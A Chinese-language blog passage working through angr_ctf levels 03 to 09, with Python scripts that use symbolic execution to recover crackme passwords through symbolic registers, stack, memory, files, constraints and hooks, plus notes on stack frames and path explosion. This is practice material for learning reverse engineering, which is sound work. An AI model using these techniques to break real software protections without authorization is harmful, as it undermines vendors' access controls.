<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">argv</span>):</span><br><span class="line">    path=argv[<span class="number">1</span>]</span><br><span class="line">    p=angr.Project(path)</span><br><span class="line">    init_state=p.factory.entry_state()</span><br><span class="line">    sm=p.factory.simgr(init_state)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">isGood</span>(<span class="params">sm</span>):<span class="comment">##sm是我们实际操作的状态，也可以用state代替</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&quot;Good Job.&quot;</span> <span class="keyword">in</span> sm.posix.dumps(<span class="number">1</span>):<span class="comment">##dumps(1)是标准输出</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">isBad</span>(<span class="params">sm</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&quot;Try again.&quot;</span> <span class="keyword">in</span> sm.posix.dumps(<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    sm.explore(find=isGood,avoid=isBad)</span><br><span class="line">    <span class="keyword">if</span> sm.found:</span><br><span class="line">        solution_state=sm.found[<span class="number">0</span>]</span><br><span class="line">        <span class="built_in">print</span>(solution_state.posix.dumps(<span class="number">0</span>))</span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> __name__ ==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main(sys.argv)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="03-angr-symbolic-registers"><a href="#03-angr-symbolic-registers" class="headerlink" title="03_angr_symbolic_registers"></a>03_angr_symbolic_registers</h2><p>根据当时作者的说明，Angr目前不支持使用scanf一次读取多个变量（例如：# scanf(“%u %u)）。您需要告诉仿真引擎在调用scanf后开始程序，并手动将符号注入寄存器。据说现在可以了，但学一下总没有坏处，能从中体会到angr的灵活。</p>
<p>首先呢确定进入的地址，就在scanf之后，0x080488C7<img src="/2023/05/28/angr%E5%AD%A6%E4%B9%A0/QQ%E6%88%AA%E5%9B%BE20230525022032.png"></p>
<p>进去之后呢因为我们跳过了scanf所以把它的参数放到该有的位置，也就是寄存器eax，ebx，edx中<img src="/2023/05/28/angr%E5%AD%A6%E4%B9%A0/QQ%E6%88%AA%E5%9B%BE20230525022100.png"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr </span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">argv</span>):</span><br><span class="line"> path=argv[<span class="number">1</span>]</span><br><span class="line"> p=angr.Project(path)</span><br><span class="line"> start_address=<span class="number">0x080488C7</span></span><br><span class="line"><span class="comment">##注意这里和之前不同，之前是factory.entry_state()</span></span><br><span class="line"> init_state=p.factory.blank_state(addr=start_address)</span><br><span class="line">    </span><br><span class="line"><span class="comment">##创建三个向量，和z3差不多，第一个pass0是符号变量名称，第二个pass0是该位宽变量的字符串标识符，后面的32指大小</span></span><br><span class="line"> pass0=claripy.BVS(<span class="string">&#x27;pass0&#x27;</span>,<span class="number">32</span>)</span><br><span class="line"> pass1=claripy.BVS(<span class="string">&#x27;pass1&#x27;</span>,<span class="number">32</span>)</span><br><span class="line"> pass2=claripy.BVS(<span class="string">&#x27;pass2&#x27;</span>,<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">##将符号放进寄存器</span></span><br><span class="line"> init_state.regs.eax=pass0</span><br><span class="line"> init_state.regs.ebx=pass1</span><br><span class="line"> init_state.regs.edx=pass2</span><br><span class="line"></span><br><span class="line"> sm=p.factory.simgr(init_state)</span><br><span class="line"> <span class="keyword">def</span> <span class="title function_">is_good</span>(<span class="params">state</span>):</span><br><span class="line">  <span class="keyword">return</span> <span class="string">b&#x27;Good Job.&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"> <span class="keyword">def</span> <span class="title function_">is_bad</span>(<span class="params">state</span>):</span><br><span class="line">  <span class="keyword">return</span> <span class="string">b&#x27;Try again.&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"> </span><br><span class="line"> sm.explore(find=is_good,avoid=is_bad)</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> sm.found:</span><br><span class="line">  soulution_state=sm.found[<span class="number">0</span>]</span><br><span class="line"><span class="comment">##注意这里不能使用print(solution_state.posix.dumps(0)),至于为什么呢，因为我们跳过了输入？</span></span><br><span class="line"><span class="comment">##约束求解，pass012代表的是状态，password012则是达到对应状态的输入</span></span><br><span class="line">  password0=soulution_state.solver.<span class="built_in">eval</span>(pass0)</span><br><span class="line">  password1=soulution_state.solver.<span class="built_in">eval</span>(pass1)</span><br><span class="line">  password2=soulution_state.solver.<span class="built_in">eval</span>(pass2)</span><br><span class="line"><span class="comment">##&#123;:x&#125;,16进制输出</span></span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;&#123;:x&#125; &#123;:x&#125; &#123;:x&#125;&quot;</span>.<span class="built_in">format</span>(password0,password1,password2))</span><br><span class="line"> <span class="keyword">else</span>:</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;no found&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"> main(sys.argv)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2023/05/28/angr%E5%AD%A6%E4%B9%A0/QQ%E6%88%AA%E5%9B%BE20230525025228.png"></p>
<h2 id="04-angr-symbolic-stack"><a href="#04-angr-symbolic-stack" class="headerlink" title="04_angr_symbolic_stack"></a>04_angr_symbolic_stack</h2><p>做这一题之前需要回顾一下栈帧，在看《逆向工程核心原理》的时候了解过。</p>
<h3 id="栈帧-函数调用"><a href="#栈帧-函数调用" class="headerlink" title="栈帧 函数调用"></a>栈帧 函数调用</h3><ol>
<li>通过push指令传参</li>
<li>将call指令的下一条指令的地址压入栈中作为返回地址</li>
<li>push ebp 保存ebp的原始值 ebp稍后会被用作栈帧指针</li>
<li>mov ebp,esp 直到函数返回前ebp中的值都是esp的初始值 我们可以通过ebp安全的访问栈中的函数参数与局部变量</li>
<li>.sub esp，x这里的x依局部变量而变，如果局部变量为两个long类型（4字节）则此处的x应该为8</li>
<li>借助mov指令和ebp创建局部变量</li>
<li>删除栈帧 mov esp，ebp（恢复栈指针），pop ebp（恢复ebp）</li>
<li>retn</li>
<li>返回原来位置后，add esp，x测出的x根据步骤0穿入的参数而定，这一步的目的是将参数从栈中清理</li>
</ol>
<p><img src="/2023/05/28/angr%E5%AD%A6%E4%B9%A0/QQ%E6%88%AA%E5%9B%BE20230525225636.png"></p>
<p>上一个题目的scanf是单独使用的，就是将我们的输入放入栈中然后再传到寄存器，所以我们只要跳到scanf执行完之后将输入放入寄存器即可。而这一题，是直接将我们的输入当作临时变量使用，即通过栈指针访问，那么我们跳过scanf之后，函数预留的那两个临时变量的位置是空的，所以我们要对栈进行操作，将函数正确的放入栈中。看上面的图，调用scanf的时候利用寄存器从右往左传参，var_10和var_c分别是第二个参数和第一个参数，所以我们将创建的符号变量依次放入ebp+var_C和ebp+var_10处即可。<img src="/2023/05/28/angr%E5%AD%A6%E4%B9%A0/QQ%E6%88%AA%E5%9B%BE20230526010927.png"></p>
<p>从ida我们可以看出，这个函数第二行sub   esp, 18h，实际上堆栈空间是0x18，但是在实际的做题中我们只是用到了那两个参数，我们就恢复了0x8.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">argv</span>):</span><br><span class="line">    path=argv[<span class="number">1</span>]</span><br><span class="line">    project=angr.Project(path)</span><br><span class="line">    start_address=<span class="number">0x080486AE</span></span><br><span class="line">    init_state=project.factory.blank_state(addr=start_address)</span><br><span class="line">    </span><br><span class="line">    pass0=claripy.BVS(<span class="string">&#x27;pass0&#x27;</span>,<span class="number">32</span>)</span><br><span class="line">    pass1=claripy.BVS(<span class="string">&#x27;pass1&#x27;</span>,<span class="number">32</span>)</span><br><span class="line">    </span><br><span class="line"><span class="comment">##由于我们跳转到了函数的中间，所以跳过了栈初始化的过程，我们要对其进行必要的还原</span></span><br><span class="line">    init_state.regs.ebp=init_state.regs.esp</span><br><span class="line">    padding_size=<span class="number">0x8</span></span><br><span class="line">    init_state.regs.esp-=padding_size</span><br><span class="line"></span><br><span class="line"><span class="comment">##将我们的输入放入正确的位置</span></span><br><span class="line">    init_state.stack_push(pass0)   <span class="comment">## 先压入参数1</span></span><br><span class="line">    init_state.stack_push(pass1)</span><br><span class="line"></span><br><span class="line">    sm=project.factory.simulation_manager(init_state)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">is_good</span>(<span class="params">state</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&#x27;Good Job.&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">is_bad</span>(<span class="params">state</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&#x27;Try again.&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    sm.explore(find=is_good,avoid=is_bad)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> sm.found:</span><br><span class="line">        solution_state=sm.found[<span class="number">0</span>]</span><br><span class="line">        password0=solution_state.solver.<span class="built_in">eval</span>(pass0)</span><br><span class="line">        password1=solution_state.solver.<span class="built_in">eval</span>(pass1)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;&#123;&#125; &#123;&#125; &quot;</span>.<span class="built_in">format</span>(password0,password1))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;no found&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main(sys.argv)</span><br></pre></td></tr></table></figure>

<p><img src="/2023/05/28/angr%E5%AD%A6%E4%B9%A0/QQ%E6%88%AA%E5%9B%BE20230526010422.png"></p>
<h3 id="疑惑"><a href="#疑惑" class="headerlink" title="疑惑"></a>疑惑</h3><h3 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h3><ul>
<li><code>solver.eval(expression)</code> 将会解出一个可行解</li>
<li><code>solver.eval_one(expression)</code>将会给出一个表达式的可行解，若有多个可行解，则抛出异常。</li>
<li><code>solver.eval_upto(expression, n)</code>将会给出最多n个可行解，如果不足n个就给出所有的可行解。</li>
<li><code>solver.eval_exact(expression, n)</code>将会给出n个可行解，如果解的个数不等于n个，将会抛出异常。</li>
<li><code>solver.min(expression)</code>将会给出最小可行解</li>
<li><code>solver.max(expression)</code>将会给出最大可行解</li>
</ul>
<h2 id="05-angr-symbolic-memory"><a href="#05-angr-symbolic-memory" class="headerlink" title="05_angr_symbolic_memory"></a>05_angr_symbolic_memory</h2><p>修改了寄存器，修改了栈，这一次开始修改内存了。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">argv</span>):</span><br><span class="line">  path=argv[<span class="number">1</span>]</span><br><span class="line">  project=angr.Project(path)</span><br><span class="line">  start_address=<span class="number">0x08048618</span></span><br><span class="line">  init_state=project.factory.blank_state(addr=start_address)</span><br><span class="line"><span class="comment">##%8s 即8个字符</span></span><br><span class="line">  passwd0=claripy.BVS(<span class="string">&#x27;passwd0&#x27;</span>,<span class="number">8</span>*<span class="number">8</span>)</span><br><span class="line">  passwd1=claripy.BVS(<span class="string">&#x27;passwd1&#x27;</span>,<span class="number">8</span>*<span class="number">8</span>)</span><br><span class="line">  passwd2=claripy.BVS(<span class="string">&#x27;passwd2&#x27;</span>,<span class="number">8</span>*<span class="number">8</span>)</span><br><span class="line">  passwd3=claripy.BVS(<span class="string">&#x27;passwd3&#x27;</span>,<span class="number">8</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">  passwd0_address=<span class="number">0x0AB232C0</span></span><br><span class="line">  passwd1_address=<span class="number">0x0AB232C8</span></span><br><span class="line">  passwd2_address=<span class="number">0x0AB232D0</span></span><br><span class="line">  passwd3_address=<span class="number">0x0AB232D8</span></span><br><span class="line"><span class="comment">##本题的不同，操作内存，store(address,value),value包含了大小</span></span><br><span class="line">  init_state.memory.store(passwd0_address,passwd0)</span><br><span class="line">  init_state.memory.store(passwd1_address,passwd1)</span><br><span class="line">  init_state.memory.store(passwd2_address,passwd2)</span><br><span class="line">  init_state.memory.store(passwd3_address,passwd3)</span><br><span class="line">  </span><br><span class="line">  sm=project.factory.simgr(init_state)</span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">is_good</span>(<span class="params">state</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&#x27;Good Job.&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">is_bad</span>(<span class="params">state</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&#x27;Try again.&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">  sm.explore(find=is_good,avoid=is_bad)</span><br><span class="line"></span><br><span class="line"><span class="comment">##cast_to=byte 将passwd转化为字节序列，decode方法将其解码为字符串</span></span><br><span class="line">  <span class="keyword">if</span> sm.found:</span><br><span class="line">        solution_state=sm.found[<span class="number">0</span>]</span><br><span class="line">        password0=solution_state.solver.<span class="built_in">eval</span>(passwd0,cast_to=<span class="built_in">bytes</span>).decode()</span><br><span class="line">        password1=solution_state.solver.<span class="built_in">eval</span>(passwd1,cast_to=<span class="built_in">bytes</span>).decode()</span><br><span class="line">        password2=solution_state.solver.<span class="built_in">eval</span>(passwd2,cast_to=<span class="built_in">bytes</span>).decode()</span><br><span class="line">        password3=solution_state.solver.<span class="built_in">eval</span>(passwd3,cast_to=<span class="built_in">bytes</span>).decode()</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;&#123;&#125; &#123;&#125; &#123;&#125; &#123;&#125; &quot;</span>.<span class="built_in">format</span>(password0,password1,password2,password3))</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;no found&quot;</span>)</span><br><span class="line">  </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  main(sys.argv)</span><br></pre></td></tr></table></figure>

<p><img src="/2023/05/28/angr%E5%AD%A6%E4%B9%A0/QQ%E6%88%AA%E5%9B%BE20230526143721.png"></p>
<h2 id="06-angr-symbolic-dynamic-memory"><a href="#06-angr-symbolic-dynamic-memory" class="headerlink" title="06_angr_symbolic_dynamic_memory"></a>06_angr_symbolic_dynamic_memory</h2><p>新知识点：符号化动态内存。</p>
<p>作者的解释文档这样写着：我们可以不告诉二进制程序将数据写入使用<code>malloc()</code>分配的内存地址，而是直接伪造一个未使用的内存块的地址，并覆盖指向数据的指针。</p>
<p>思路是这样的：malloc函数返回值是一个地址，储存到了buffer里，我们伪造一个地址放到buffer即可，然后在我们伪造的地址处填入符号。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr </span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">argv</span>):</span><br><span class="line">    path=argv[<span class="number">1</span>]</span><br><span class="line">    start_address=<span class="number">0x080486AF</span></span><br><span class="line">    project=angr.Project(path)</span><br><span class="line">    init_state=project.factory.blank_state(addr=start_address)</span><br><span class="line"></span><br><span class="line">    passwd_size=<span class="number">8</span>*<span class="number">8</span></span><br><span class="line">    passwd0=claripy.BVS(<span class="string">&#x27;passwd0&#x27;</span>,passwd_size)</span><br><span class="line">    passwd1=claripy.BVS(<span class="string">&#x27;passwd1&#x27;</span>,passwd_size)</span><br><span class="line"></span><br><span class="line">    fake_heap_address0=<span class="number">0x0804A144</span></span><br><span class="line">    fake_heap_address1=<span class="number">0x0804A154</span></span><br><span class="line">    real_address0=<span class="number">0x0A2DEF74</span></span><br><span class="line">    real_address1=<span class="number">0x0A2DEF7C</span></span><br><span class="line">    </span><br><span class="line">    init_state.memory.store(real_address0,fake_heap_address0,endness=project.arch.memory_endness)</span><br><span class="line">    init_state.memory.store(real_address1,fake_heap_address1,endness=project.arch.memory_endness)</span><br><span class="line"></span><br><span class="line">    init_state.memory.store(fake_heap_address0,passwd0)</span><br><span class="line">    init_state.memory.store(fake_heap_address1,passwd1)</span><br><span class="line"></span><br><span class="line">    sm=project.factory.simgr(init_state)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">is_good</span>(<span class="params">state</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&#x27;Good Job.&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">is_bad</span>(<span class="params">state</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&#x27;Try again.&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    sm.explore(find=is_good,avoid=is_bad)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> sm.found:</span><br><span class="line">        solution_state=sm.found[<span class="number">0</span>]</span><br><span class="line">        password0=solution_state.solver.<span class="built_in">eval</span>(passwd0,cast_to=<span class="built_in">bytes</span>).decode()</span><br><span class="line">        password1=solution_state.solver.<span class="built_in">eval</span>(passwd1,cast_to=<span class="built_in">bytes</span>).decode()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;&#123;&#125; &#123;&#125; &quot;</span>.<span class="built_in">format</span>(password0,password1))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;no found&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main(sys.argv)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">init_state.memory.store(real_address0,fake_heap_address0,endness=project.arch.memory_endness)</span><br><span class="line">（原地址，我们指定的假地址，端序），原地址指的是存放malloc返回值的变量的地址，此处endness是和本项目相同</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>endness可选项</p>
<figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line"><span class="keyword">LE</span> – 小端序<span class="comment">(little endian, least significant byte is stored at lowest address)</span></span><br><span class="line">BE – 大端序<span class="comment">(big endian, most significant byte is stored at lowest address)</span></span><br><span class="line">ME – 中间序<span class="comment">(Middle-endian. Yep.)</span></span><br></pre></td></tr></table></figure>

<p><img src="/2023/05/28/angr%E5%AD%A6%E4%B9%A0/QQ%E6%88%AA%E5%9B%BE20230526234028.png"></p>
<h2 id="07-angr-symbolic-file"><a href="#07-angr-symbolic-file" class="headerlink" title="07_angr_symbolic_file"></a>07_angr_symbolic_file</h2><p>新知识点：符号化文件内</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">argv</span>):</span><br><span class="line">    path=argv[<span class="number">1</span>]</span><br><span class="line">    project=angr.Project(path)</span><br><span class="line">    start_address=<span class="number">0x080488BC</span></span><br><span class="line">    init_state=project.factory.blank_state(addr=start_address)</span><br><span class="line"></span><br><span class="line">    filename=<span class="string">&#x27;FOQVSBZB.txt&#x27;</span></span><br><span class="line">    filesize=<span class="number">0x40</span></span><br><span class="line">    passwd0=claripy.BVS(<span class="string">&#x27;passwd0&#x27;</span>,filesize*<span class="number">8</span>)</span><br><span class="line">    passwdfile=angr.storage.SimFile(filename,content=passwd0,size=filesize)</span><br><span class="line"></span><br><span class="line">    init_state.fs.insert(filename,passwdfile)</span><br><span class="line">    </span><br><span class="line">    sm=project.factory.simgr(init_state)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">is_good</span>(<span class="params">state</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&#x27;Good Job.&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">is_bad</span>(<span class="params">state</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&#x27;Try again.&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    sm.explore(find=is_good,avoid=is_bad)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> sm.found:</span><br><span class="line">        solution_state=sm.found[<span class="number">0</span>]</span><br><span class="line">        password0=solution_state.solver.<span class="built_in">eval</span>(passwd0,cast_to=<span class="built_in">bytes</span>).decode()</span><br><span class="line">        <span class="built_in">print</span>(password0)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;no found&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main(sys.argv)</span><br><span class="line">   </span><br></pre></td></tr></table></figure>

<p>新操作，创建虚拟文件并将其放入仿真文件系统</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">##创建同名的虚拟文件，必须要和题目中给出的文件名一致</span></span><br><span class="line">filename=<span class="string">&#x27;FOQVSBZB.txt&#x27;</span></span><br><span class="line">filesize_byte=<span class="number">0x40</span></span><br><span class="line"><span class="comment">##符号化文件内容</span></span><br><span class="line">passwd0=claripy.BVS(<span class="string">&#x27;passwd0&#x27;</span>,filesize*<span class="number">8</span>)</span><br><span class="line"><span class="comment">##创建符号化文件，参数是（文件名，内容，大小byte）</span></span><br><span class="line">passwdfile=angr.storage.SimFile(filename,content=passwd0,size=filesize)</span><br><span class="line"></span><br><span class="line"><span class="comment">##将文件放入仿真文件系统,这一步我的理解就是替换，访问文件时直接访问我们创建的同名文件</span></span><br><span class="line">init_state.fs.insert(filename,passwdfile)</span><br></pre></td></tr></table></figure>

<p><img src="/2023/05/28/angr%E5%AD%A6%E4%B9%A0/QQ%E6%88%AA%E5%9B%BE20230527140218.png"></p>
<h2 id="08-angr-constraints"><a href="#08-angr-constraints" class="headerlink" title="08_angr_constraints"></a>08_angr_constraints</h2><p>开始之前先了解一下路径爆炸。因为这次的新知识点就是：通过添加约束解决路径爆炸问题。</p>
<h3 id="路径爆炸"><a href="#路径爆炸" class="headerlink" title="路径爆炸"></a>路径爆炸</h3><p>路径爆炸(Path explosion)指的是在有限状态机或接收器的设计过程中,状态数或路径数呈指数增长的现象。当程序经历的所有可能路径数量超过计算机的处理能力时，就会出现路径爆炸的问题。</p>
<p>路径爆炸是软件测试和验证中一个重要的问题。在对程序进行测试或验证时，需要覆盖程序的所有可能路径，以确保程序的正确性和安全性。但是，当程序中存在复杂的控制流结构时，这个任务就变得非常艰巨。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">argv</span>):</span><br><span class="line">    path=argv[<span class="number">1</span>]</span><br><span class="line">    project=angr.Project(path)</span><br><span class="line">    start_address=<span class="number">0x0804863C</span></span><br><span class="line">    buffer_address=<span class="number">0x0804A040</span></span><br><span class="line">    ckeckfun_address=<span class="number">0x0804857C</span></span><br><span class="line"></span><br><span class="line">    init_state=project.factory.blank_state(addr=start_address)</span><br><span class="line"></span><br><span class="line">    passwd_len=<span class="number">16</span></span><br><span class="line">    passwd0=claripy.BVS(<span class="string">&#x27;passwd0&#x27;</span>,passwd_len*<span class="number">8</span>)</span><br><span class="line">    init_state.memory.store(buffer_address,passwd0)</span><br><span class="line"></span><br><span class="line">    simulation=project.factory.simulation_manager(init_state)</span><br><span class="line">    simulation.explore(find=ckeckfun_address)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> simulation.found:</span><br><span class="line">        solution_state=simulation.found[<span class="number">0</span>]</span><br><span class="line">        parameter_address=buffer_address</span><br><span class="line">        parameter_size_bytes=<span class="number">16</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">##.load读出buffer处的内存数据</span></span><br><span class="line">        parameter_bitvector=solution_state.memory.load(parameter_address,parameter_size_bytes)</span><br><span class="line">        compare_valve=<span class="string">&#x27;OSIWHBXIFOQVSBZB&#x27;</span></span><br><span class="line">        solution_state.solver.add(parameter_bitvector==compare_valve)</span><br><span class="line">        solution0=solution_state.solver.<span class="built_in">eval</span>(passwd0,cast_to=<span class="built_in">bytes</span>).decode()</span><br><span class="line">        <span class="built_in">print</span>(solution0)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;no found&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main(sys.argv)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>如果按照程序之前的逻辑，按字节进行比对，16byte长度的数据就会产生2^16个分支，分支呈指数级增长，因此我们不按照他的逻辑进行比对，我们的输入经过一些操作之后还是被存储在buffer里，我们直接拿处理过后的buffer与comparedata进行比较，这样这样就变成了简单的爆破，不会造成路径爆炸。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">ckeckfun_address=<span class="number">0x0804857C</span></span><br><span class="line"><span class="comment">##模拟到这个检测函数，其他的就不管了，只要让buffer满足条件即可，下面增加的约束就相当于创建了一个函数，实现的功能和之前的check是相等的，不过不是按位比较</span></span><br><span class="line">simulation.explore(find=ckeckfun_address)</span><br><span class="line"><span class="comment">##运行到调用比较函数的状态</span></span><br><span class="line"><span class="keyword">if</span> simulation.found:</span><br><span class="line">        solution_state=simulation.found[<span class="number">0</span>]</span><br><span class="line">        parameter_address=buffer_address</span><br><span class="line">        parameter_size_bytes=<span class="number">16</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">##.load读出buffer处的内存数据，即读取符号向量</span></span><br><span class="line">        parameter_bitvector=solution_state.memory.load(parameter_address,parameter_size_bytes)</span><br><span class="line">        compare_valve=<span class="string">&#x27;OSIWHBXIFOQVSBZB&#x27;</span></span><br><span class="line">        <span class="comment">##.add(约束内容)，约束条件：运行到此处buffer的值与比较数据相等</span></span><br><span class="line">        solution_state.solver.add(parameter_bitvector==compare_valve)</span><br><span class="line">        solution0=solution_state.solver.<span class="built_in">eval</span>(passwd0,cast_to=<span class="built_in">bytes</span>).decode()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2023/05/28/angr%E5%AD%A6%E4%B9%A0/QQ%E6%88%AA%E5%9B%BE20230527215116.png"></p>
<h2 id="09-angr-hooks"><a href="#09-angr-hooks" class="headerlink" title="09_angr_hooks"></a>09_angr_hooks</h2><p>新知识点：hook。</p>
<blockquote>
<p>wiki：</p>
<p>钩子编程（hooking），也称作“挂钩”，是计算机程序设计术语，指<strong>通过拦截软件模块间的函数调用、消息传递、事件传递来修改或扩展操作系统、应用程序或其他软件组件的行为的各种技术</strong>。 处理被拦截的函数调用、事件、消息的代码，被称为钩子（hook）。</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">argv</span>):</span><br><span class="line">    path=argv[<span class="number">1</span>]</span><br><span class="line">    project=angr.Project(path)</span><br><span class="line">    init_state=project.factory.entry_state()</span><br><span class="line"></span><br><span class="line">    checkfun_address=<span class="number">0x080486CA</span></span><br><span class="line">    <span class="comment">##定义执行完要跳过多少字节，这意味着我们直接替换了这个函数</span></span><br><span class="line">    jump_len=<span class="number">5</span></span><br><span class="line"><span class="meta">    @project.hook(<span class="params">checkfun_address,length=jump_len</span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">fake_checkfun</span>(<span class="params">state</span>):</span><br><span class="line">        buffer_address=<span class="number">0x0804A044</span></span><br><span class="line">        buffer_len=<span 